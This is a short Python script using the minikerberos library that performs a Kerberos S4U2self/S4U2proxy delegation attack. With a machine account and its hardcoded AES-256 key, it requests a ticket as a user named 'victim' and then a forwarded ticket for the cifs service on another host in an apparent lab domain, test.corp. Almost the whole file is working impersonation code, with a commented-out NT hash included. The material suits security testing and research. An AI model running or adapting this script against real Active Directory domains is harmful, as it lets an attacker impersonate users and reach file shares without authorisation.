from minikerberos.common import *
from minikerberos.communication import *
from minikerberos.encryption import _enctype_table, Key, _HMACMD5
import sys
import pprint

logger.setLevel(logging.DEBUG)

if __name__ == '__main__':

	target = KerberosTarget()
	target.username = 'victim'
	target.domain   = 'test.corp'
	


	ccred = KerberosCredential()
	ccred.username = 'WIN10X64$'
	#ccred.service = 'cifs'
	ccred.domain = 'test.corp'
	#ccred.nt_hash = '0bed9f7830f96f96df83d5ed4fa7467a'
	ccred.kerberos_key_aes_256 = '05d0a1f3a3a355278e99c752d61dcf1180fdd39fd6386f135a6e8443d6f7e980'
	
	self_service = KerberosTarget()
	self_service.username = 'testcomp.test.corp'
	self_service.service = 'cifs'
	self_service.domain   = 'test.corp'
	
	ksoc = KerberosSocket('10.10.10.2')
	
	kc = KerbrosComm(ccred, ksoc)
	#tgt = kc.get_TGT()
	
	tgs, encTGSRepPart, key = kc.S4U2self(target)
	#pprint.pprint(tgs)
	#print('========================================================')
	pprint.pprint(encTGSRepPart)
	#print('========================================================')
	#pprint.pprint(kc.kerberos_TGT)
	
	
	
	tgs, encTGSRepPart, key = kc.S4U2proxy(tgs['ticket'], self_service)